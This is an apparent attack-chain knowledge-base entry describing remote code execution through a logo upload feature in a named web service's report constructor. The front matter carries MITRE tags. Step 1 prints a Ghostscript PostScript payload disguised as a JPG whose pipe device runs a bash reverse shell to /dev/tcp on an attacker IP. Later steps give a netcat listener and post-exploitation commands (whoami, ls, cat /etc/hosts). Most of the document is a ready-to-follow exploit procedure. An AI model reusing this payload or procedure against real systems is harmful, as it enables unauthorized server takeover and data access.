---
tags:
  - rce
  - file-upload
  - imagemagick
  - ghostscript
  - reverse-shell
type: attack_chain
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/Ghostscript]]'
  - '[[tools/Netcat]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/postscript-payload-rce]]'
  - '[[commands/bash-reverse-shell]]'
  - '[[commands/ls-directory-list]]'
  - '[[commands/whoami-user-identification]]'
  - '[[commands/cat-hosts-file]]'
platforms:
  - Web
  - Linux
complexity: medium
procedures:
  - '[[procedures/Create-Malicious-Postscript-Payload]]'
  - '[[procedures/Upload-Malicious-File-to-Semrush]]'
  - '[[procedures/Receive-and-Interact-with-Reverse-Shell]]'
  - '[[procedures/Verify-Server-Identity]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
description: >-
  Exploits a remote code execution vulnerability in Semrush's report constructor
  logo upload feature using a malicious Postscript payload to gain reverse shell
  access.
skill_level: intermediate
impact_level: high
id: 6bf7da77-7512-4255-99d1-ffa777b17b6a
created_at: '2025-12-11T06:10:33.254Z'
updated_at: '2025-12-11T06:10:33.254Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
---
# Remote Code Execution via Malicious Logo Upload in Semrush Report Constructor

Multi-stage attack chain demonstrating exploitation of an improperly patched ImageMagick instance in Semrush's report constructor, allowing arbitrary command execution via Ghostscript triggered by a malicious Postscript file disguised as a JPG.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Payload] --> B[Upload File]
    B --> C[Receive Shell]
    C --> D[Verify Identity]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ImageMagick]]
- [[tools/Ghostscript]]
- [[tools/Netcat]]

### Target Environment

- Target OS/Platform: Web application on Linux server
- Required services/ports: Access to https://www.semrush.com/my_reports/constructor, listener on port 8080
- Network access requirements: Ability to upload files to the target URL and receive connections on the attacker's IP/port

### Initial Access Requirements

- Credential requirements: Access to Semrush report constructor (assumed public or registered user)
- Network position: External access to the web application
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Payload Creation - [[procedures/Create-Malicious-Postscript-Payload]]

**Procedure**: [[procedures/Create-Malicious-Postscript-Payload]]

**Objective**: Craft a Postscript file disguised as JPG that triggers Ghostscript to execute a reverse shell.

**Expected Output**: A file named 'test.jpg' containing the malicious payload.

**Success Indicators**:
- File created successfully without syntax errors.
- Payload includes reverse shell command pointing to attacker's IP and port.

First, create the Postscript payload using [[commands/postscript-payload-rce]]:

```bash
%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

Save this as 'test.jpg'.

### Step 2: File Upload - [[procedures/Upload-Malicious-File-to-Semrush]]

**Procedure**: [[procedures/Upload-Malicious-File-to-Semrush]]

**Objective**: Upload the malicious file to trigger ImageMagick processing and Ghostscript execution.

**Expected Output**: Successful upload and processing, leading to reverse shell initiation.

**Success Indicators**:
- Upload confirmation from the web interface.
- Incoming connection on the listener port.

Upload 'test.jpg' to the logo upload feature at https://www.semrush.com/my_reports/constructor.

### Step 3: Shell Interaction - [[procedures/Receive-and-Interact-with-Reverse-Shell]]

**Procedure**: [[procedures/Receive-and-Interact-with-Reverse-Shell]]

**Objective**: Receive the reverse shell and execute exploratory commands.

**Expected Output**: Interactive shell access allowing command execution.

**Success Indicators**:
- Reverse shell connection established.
- Successful execution of commands like [[commands/ls-directory-list]], [[commands/whoami-user-identification]], and [[commands/cat-hosts-file]].

Set up a listener with [[tools/Netcat]] on port 8080:

```bash
nc -lvnp 8080
```

Once connected, run:

```bash
ls
```

```bash
whoami
```

```bash
cat /etc/hosts
```

### Step 4: Identity Verification - [[procedures/Verify-Server-Identity]]

**Procedure**: [[procedures/Verify-Server-Identity]]

**Objective**: Confirm the compromised server is a Semrush instance.

**Expected Output**: Verification of server identity through file listings and URL access.

**Success Indicators**:
- Hosts file shows Semrush-related entries.
- Accessible URLs match expected Semrush paths.

Navigate to https://www.semrush.com/my_reports/████ and https://www.semrush.com/my_reports/████████ to confirm files from ls output.

## Attack Chain Summary

### Key Achievements

1. Gained initial access via file upload vulnerability.
2. Achieved remote code execution and reverse shell.
3. Explored server filesystem and confirmed identity.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: [TIMESTAMP]*
